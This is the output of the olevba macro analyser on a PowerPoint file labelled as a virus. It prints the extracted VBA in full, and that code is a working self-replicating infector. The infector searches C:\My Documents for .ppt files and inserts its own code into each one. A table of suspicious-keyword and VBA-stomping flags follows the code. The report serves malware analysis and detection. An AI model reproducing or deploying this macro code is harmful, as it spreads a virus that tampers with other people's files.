olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.Vic.b.ppt
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: None - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'PPT.Attach v0.1 /1nternal
Private Sub UserForm_Terminate()
    On Error Resume Next
    Set Home = ActivePresentation
    Set fs = Application.FileSearch
    fs.NewSearch
    fs.LookIn = "C:\My Documents"
    fs.SearchSubFolders = True
    fs.FileName = "*.ppt"
    fs.Execute
    For i = 1 To fs.FoundFiles.Count
        If InStr(1, fs.FoundFiles(i), "~", 1) = 0 And fs.FoundFiles(i) <> Home.FullName Then
            Set PVict = Presentations.Open(fs.FoundFiles(i))
            For j = 1 To PVict.VBProject.VBcomponents.Count
                If PVict.VBProject.VBcomponents(j).Type = 1 Then
                    If PVict.VBProject.VBcomponents(j).Codemodule.Lines(1, 1) <> "'<!--1nternal-->" Then
                        PVict.VBProject.VBcomponents(j).Codemodule.InsertLines 1, Home.VBProject.VBcomponents(Name).Codemodule.Lines(1, 27)
                        PVict.Save
                    End If
                End If
            Next
            PVict.Close
        End If
    Next
    Set PVict = Nothing
End Sub
Sub Macro1()
Attribute Macro1.VB_Description = "Macro recorded 14/12/98 by O.B.1. Canobi"
'
' Macro recorded 14/12/98 by O.B.1. Canobi
'
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=0).Select
    With ActiveWindow.Selection.TextRange
        .Text = "CEBO DE PRUEBA CON MACRO."
        With .Font
            .Name = "Times New Roman"
            .Size = 28
            .Bold = msoFalse
            .Italic = msoFalse
            .Underline = msoFalse
            .Shadow = msoFalse
            .Emboss = msoFalse
            .BaselineOffset = 0
            .AutoRotateNumbers = msoFalse
            .Color.SchemeColor = ppForeground
        End With
    End With
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Size = 20
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Size = 36
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Shadow = msoTrue
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Underline = msoTrue
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Shadow = msoFalse
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Shadow = msoTrue
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Bold = msoTrue
    ActiveWindow.Selection.ShapeRange.TextFrame.TextRange.Characters(Start:=1, Length:=26).Select
    ActiveWindow.Selection.TextRange.Font.Italic = msoTrue
    ActiveWindow.Selection.TextRange.Font.Color.SchemeColor = ppForeground
    ActiveWindow.Selection.TextRange.Font.Color.RGB = RGB(Red:=0, Green:=0, Blue:=204)
    ActivePresentation.ExtraColors.Add RGB(Red:=0, Green:=0, Blue:=204)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

